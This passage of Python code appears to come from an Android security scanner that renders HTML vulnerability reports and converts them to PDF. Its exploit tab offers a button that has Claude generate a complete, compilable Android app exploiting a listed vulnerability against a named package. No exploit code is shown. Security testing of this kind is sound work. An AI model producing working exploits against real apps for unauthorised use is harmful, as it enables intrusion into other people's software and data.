      <div class="section-heading"><i class="fa-solid fa-align-left"></i> Description</div>
      <div class="desc-text">{html.escape(str(desc))}</div>
      {evidence_html}
      {occ_html}
      {wv_html}
    </div>

    <!-- REVIEWER NOTES TAB -->
    {reviewer_tab_pane}

    <!-- EXPLOIT TAB -->
    <div class="tab-pane" id="tab-exploit-{index}">
      {poc_html}
      {attack_html}
      <div style="margin-top:20px;padding-top:16px;border-top:1px solid var(--border2)">
        <div class="section-heading"><i class="fa-solid fa-wand-magic-sparkles" style="color:#a78bfa"></i> AI-Generated PoC App</div>
        <button class="gen-poc-btn" onclick="openPocModal({index - 1})">
          <i class="fa-solid fa-wand-magic-sparkles"></i> Generate PoC Android App with Claude
        </button>
        <div class="poc-gen-note">
          <i class="fa-solid fa-circle-info"></i>
          Generates a complete, compilable Android Studio project that exploits this specific vulnerability
          against <code>{html.escape(package)}</code>
        </div>
      </div>
    </div>

    <!-- REMEDIATION TAB -->
    <div class="tab-pane" id="tab-remediation-{index}">
      {rem_html if rem_html else '<p style="color:var(--text3);font-size:13px">No remediation details available.</p>'}
    </div>

  </div>
</div>'''


def render_pdf_from_html(html_path: str, output_pdf: str) -> Optional[str]:
    """Convert HTML report to PDF using available renderer."""
    wkhtmltopdf = shutil.which("wkhtmltopdf")
    if wkhtmltopdf:
        result = subprocess.run(
            [wkhtmltopdf, "--enable-local-file-access", html_path, output_pdf],
            check=False, capture_output=True
        )
        if result.returncode == 0:
            return output_pdf
    try:
        from weasyprint import HTML
        HTML(filename=html_path).write_pdf(output_pdf)
        return output_pdf
    except Exception:
        pass
    return None
